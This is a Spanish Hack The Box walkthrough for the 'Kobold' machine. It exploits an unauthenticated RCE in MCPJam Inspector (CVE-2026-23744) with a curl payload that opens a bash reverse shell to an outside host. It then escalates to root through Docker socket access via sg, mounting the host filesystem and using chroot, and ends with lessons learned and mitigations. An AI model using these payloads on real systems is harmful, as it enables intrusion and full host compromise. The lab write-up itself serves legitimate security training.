---
title: "HTB Walkthrough: Kobold"
date: 2026-06-01
draft: false
description: "Walkthrough completo de la máquina Kobold de Hack The Box. Dificultad Easy, OS Linux. RCE sin autenticación en MCPJam Inspector 1.4.2 (CVE-2026-23744) vía el endpoint /api/mcp/connect → shell como ben → acceso al socket Docker a través del grupo operator con sg docker → montaje del filesystem raíz del host y chroot para obtener root."
tags: ["HackTheBox", "Linux", "Easy", "CVE-2026-23744", "MCPJam", "RCE", "Docker", "DockerEscape", "sg", "PrivEsc", "MCP", "kobold", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Kobold** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux**. La explotación pasa por **CVE-2026-23744**, una RCE sin autenticación en MCPJam Inspector 1.4.2: el endpoint `/api/mcp/connect` pasa el campo `command` directamente a `child_process.spawn()` sin ninguna validación. La escalada a root explota que el usuario `ben` pertenece al grupo `operator`, que tiene permisos sobre el socket Docker — accesible mediante `sg docker` sin necesidad de logout. Una vez con acceso al daemon Docker, montamos el filesystem del host y obtenemos root con `chroot`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                     |
|----------------|---------------------------------------------------------------------------------------------|
| **Nombre**     | Kobold                                                                                      |
| **OS**         | Linux (Ubuntu)                                                                              |
| **Dificultad** | Easy                                                                                        |
| **IP**         | 10.129.6.231                                                                                |
| **Técnicas**   | CVE-2026-23744 · MCPJam RCE · Docker socket escape · `sg` group bypass · `chroot` privesc  |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.6.231
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver
```

```bash
echo "10.129.6.231 kobold.htb" >> /etc/hosts
```

> **💡 Superficie de ataque:** dos puertos web (80/443) y un servicio desconocido en 3552. El foco inicial es la aplicación web.

---

## 2. Enumeración de Subdominios

```bash
gobuster vhost -u "https://kobold.htb" \
  -w /usr/share/wordlists/dirb/common.txt \
  --append-domain \
  --no-tls-validation
```

```
Found: bin.kobold.htb   [Status: 200, Size: 24402]
Found: mcp.kobold.htb   [Status: 200, Size: 466]
```

```bash
echo "10.129.6.231 bin.kobold.htb mcp.kobold.htb" >> /etc/hosts
```

- `bin.kobold.htb` → Instancia de **PrivateBin** (compartición de texto/código). Corre en un contenedor Docker en el puerto interno 8080.
- `mcp.kobold.htb` → Instancia de **MCPJam Inspector versión 1.4.2** — vulnerable al **CVE-2026-23744**.

---

## 3. Explotación — CVE-2026-23744 (MCPJam Inspector RCE)

### 3.1 La Vulnerabilidad

El endpoint `/api/mcp/connect` de MCPJam Inspector 1.4.2 acepta un `serverConfig` con el campo `command`, que se pasa directamente a `child_process.spawn()` **sin validación ni autenticación**. Podemos especificar `bash` como comando y una reverse shell como argumento.

### 3.2 Ejecución del Exploit

```bash
nc -lvnp 4444
```

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.211/4444 0>&1"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

> **💡 `-k`** ignora el certificado TLS autofirmado del servidor.

```
Connection received on 10.129.6.231
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

> ✅ **Shell obtenida como `ben`.** El grupo `operator` es relevante — lo retomaremos en la escalada.

### 3.3 Estabilización de la TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=bash
stty rows 40 cols 150; reset
```

---

## 4. User Flag

```bash
ben@kobold:~$ cat user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 5. Escalada de Privilegios — Docker Socket Escape vía `sg`

### 5.1 Enumeración del Entorno Docker

```bash
ben@kobold:~$ docker ps
```

```
permission denied while trying to connect to the Docker daemon socket at
unix:///var/run/docker.sock: connect: permission denied
```

`ben` no pertenece al grupo `docker` directamente. Pero pertenece al grupo **`operator`** — probamos ejecutar en su contexto con `sg`:

```bash
ben@kobold:~$ sg docker -c "docker ps"
```

```
CONTAINER ID   IMAGE                               COMMAND                  STATUS
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"  Up 2 hours
                                                                            127.0.0.1:8080->8080/tcp  bin
```

> **💡 `sg <grupo> -c "<cmd>"`** ejecuta un comando con el GID efectivo del grupo especificado, sin necesidad de logout/login. Funciona porque `operator` tiene permisos sobre `/var/run/docker.sock`, aunque `ben` no lo vea en su listado de grupos principal.

### 5.2 Por Qué el Socket Docker Permite Escalar a Root

El socket `/var/run/docker.sock` permite controlar el daemon Docker, que corre como root. Con acceso a ese socket podemos lanzar un contenedor con el **filesystem raíz del host montado** (`-v /:/mnt`) y ejecutarlo como UID 0 (`-u 0`). Una vez dentro, `chroot /mnt` cambia nuestra raíz al filesystem del host, obteniendo acceso total como root.

### 5.3 Escape al Host

```bash
ben@kobold:~$ sg docker -c "docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2"
```

| Parámetro | Efecto |
|---|---|
| `--rm` | Elimina el contenedor al salir (limpieza) |
| `-it` | Terminal interactiva |
| `-u 0` | Ejecutar como UID 0 (root) dentro del contenedor |
| `--entrypoint sh` | Sobreescribe el entrypoint para obtener una shell directamente |
| `-v /:/mnt` | Monta el filesystem raíz del **host** en `/mnt` dentro del contenedor |

```bash
/var/www # chroot /mnt sh
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),27(sudo)
```

> ✅ **Root obtenido. `chroot /mnt` hace que todos los comandos operen sobre el sistema host real con privilegios de root.**

---

## 6. Root Flag

```bash
# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 7. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Puertos 22, 80, 443, 3552. Virtual host `kobold.htb`.
2. **Gobuster vhost** → Subdominios `bin.kobold.htb` (PrivateBin) y `mcp.kobold.htb` (MCPJam Inspector 1.4.2).
3. **CVE-2026-23744** → `/api/mcp/connect` sin validación → `bash` como `command` → reverse shell como `ben`.
4. **`id`** → `ben` pertenece al grupo `operator`.
5. **`sg docker`** → acceso al socket Docker a través del GID de `operator`.
6. **`docker run -u 0 -v /:/mnt`** → contenedor root con el host montado.
7. **`chroot /mnt`** → filesystem del host como root.

**Lo que aprendí con esta máquina:**

- **`child_process.spawn()` con input no validado es RCE directa.** MCPJam pasaba el campo `command` de la petición JSON directamente al spawner de procesos sin ningún tipo de lista blanca ni autenticación. En aplicaciones Node.js que necesitan ejecutar subprocesos, la única forma segura es construir la lista de argumentos de forma estática — nunca interpolando input de usuario — y aplicar autenticación antes de cualquier endpoint que interactúe con el sistema.

- **La pertenencia a grupos secundarios puede no ser obvia en la salida de `id`, pero `sg` la materializa.** `ben` no aparecía en el grupo `docker`, pero `operator` tenía permisos sobre el socket. Enumerar `/var/run/docker.sock` y cruzar con los grupos del usuario (incluyendo grupos indirectos) es un paso que conviene automatizar en cualquier script de enumeración post-explotación.

- **El acceso al socket Docker equivale a root en el host, sin excepción.** No importa si el usuario no tiene `sudo`, si está en un contenedor, o si los permisos del sistema parecen restringidos — si puede hablar con `/var/run/docker.sock`, tiene root. Esta máquina lo ilustra de forma limpia: la "restricción" de que `ben` no estuviera en el grupo `docker` era irrelevante porque `operator` abría la misma puerta por el lado.

- **`sg` es una herramienta legítima del sistema que puede usarse como vector de escalada.** Muchos post-exploitation guides no la mencionan, pero en cualquier sistema donde un usuario pertenece a un grupo secundario con permisos elevados sobre un recurso crítico, `sg` permite materializar esos permisos en un comando sin modificar la sesión actual. Vale la pena tenerla en el radar junto a `newgrp` y similares.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2026-23744 — MCPJam RCE en `/api/mcp/connect` | Actualizar MCPJam Inspector; no exponer el inspector sin autenticación; validar y usar lista blanca de comandos permitidos |
| Socket Docker accesible vía grupo `operator` | Nunca dar acceso a `/var/run/docker.sock` a usuarios no privilegiados; usar `rootless Docker` o `Podman` donde sea posible |
| `sg docker` permite bypass del grupo | Auditar qué grupos tienen permisos sobre el socket; restringir con `chmod`/`chown`; considerar `ACL` de filesystem para control más granular |
| `docker run -v /:/mnt` permite leer/escribir el host completo | Usar `--read-only` y perfiles `seccomp`/`AppArmor`; nunca montar el filesystem raíz del host en contenedores de producción |
